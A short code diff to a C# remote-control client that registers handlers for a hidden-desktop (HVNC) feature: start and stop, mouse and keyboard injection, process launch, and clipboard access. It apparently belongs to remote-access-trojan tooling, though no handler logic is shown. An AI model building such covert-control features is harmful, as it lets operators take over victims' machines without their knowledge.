@@ -51,6 +51,16 @@ namespace RemoteControl.Client
             handlers.Add(ePacketType.PACKET_GET_NETWORK_CONNECTIONS_REQUEST, new RequestGetNetworkConnectionsHandler());
             handlers.Add(ePacketType.PACKET_GET_HOST_INFO_REQUEST, new RequestGetHostInfoHandler());
 
+            // HVNC 隐形桌面
+            RequestHVNCHandler hvncHandler = new RequestHVNCHandler();
+            handlers.Add(ePacketType.PACKET_HVNC_START_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_STOP_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_CLIPBOARD_GET_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_CLIPBOARD_SET_REQUEST, hvncHandler);
+
             return handlers;
         }
     }
